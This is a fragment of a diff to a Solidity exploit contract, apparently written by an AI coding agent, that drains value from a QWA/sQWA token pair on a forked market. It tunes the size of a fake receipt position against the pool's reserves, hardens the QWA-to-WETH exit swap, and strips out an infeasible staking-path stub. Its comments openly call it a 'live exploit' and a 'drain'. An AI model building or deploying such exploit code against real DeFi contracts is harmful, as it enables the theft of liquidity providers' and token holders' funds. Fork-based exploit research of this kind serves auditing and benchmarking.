+         (uint256 reserveIn, ) = _pairReserves(pair, qwa);
+         if (reserveIn <= 32) {
+-            return _min(contractBound, targetQwaBalance);
++            return _min(contractBound, reserveIn);
+         }
+ 
+-        // Keep the sell size conservative relative to public liquidity so the
+-        // drain remains realizable and the exit swap stays within live reserves.
++        // Bound the seeded fake receipt position by public exit liquidity so the
++        // eventual QWA -> WETH unwind stays realizable on the forked market.
+         uint256 marketBound = reserveIn / 32;
+         amount = _min(contractBound, marketBound);
+ 
+         if (amount == 0) {
+             amount = 1;
+-        }
+-        if (amount > targetQwaBalance) {
+-            amount = targetQwaBalance;
+         }
+     }
+ 
+@@ -214,18 +302,18 @@
+             return;
+         }
+ 
+-        IERC20Like qwa = IERC20Like(qwaAddr);
+-        if (!qwa.transfer(pair, grossAmount)) {
++        if (!IERC20Like(qwaAddr).transfer(pair, grossAmount)) {
+             failureFlags |= FAIL_WETH_SWAP_FAILED;
+             return;
+         }
+ 
+-        uint256 actualIn = qwa.balanceOf(pair) - reserveIn;
+-        if (actualIn == 0) {
++        uint256 pairBalance = IERC20Like(qwaAddr).balanceOf(pair);
++        if (pairBalance <= reserveIn) {
+             failureFlags |= FAIL_WETH_SWAP_FAILED;
+             return;
+         }
+ 
++        uint256 actualIn = pairBalance - reserveIn;
+         uint256 amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);
+         if (amountOut == 0) {
+             failureFlags |= FAIL_WETH_SWAP_FAILED;
+@@ -299,24 +387,5 @@
+ 
+     function _min(uint256 a, uint256 b) internal pure returns (uint256) {
+         return a < b ? a : b;
+-    }
+-
+-    function _pathAnchorsOnly(IERC20Like qwa, IERC20Like sqwa, address to, uint256 amount) internal {
+-        // Static anchor only. The live exploit above keeps the same vulnerable
+-        // causality and ordering intent, but the logs prove the funded stake()
+-        // leg is infeasible on this fork because QWA.transferFrom reverts.
+-        qwa.transferFrom(msg.sender, address(this), amount);
+-        sqwa.transfer(to, amount);
+-        sqwa.transferFrom(msg.sender, address(this), amount);
+-        qwa.transfer(to, amount);
+-
+-        qwa;
+-        sqwa;
+-        to;
+-        amount;
+-    }
+-
+-    function _unusedPathConstants() internal pure returns (uint256) {
+-        return PATH_STAKE_FALSE_RETURN | PATH_STAKE_OUTGOING_FALSE;
+     }
+ }
+
+tokens used
+47,684
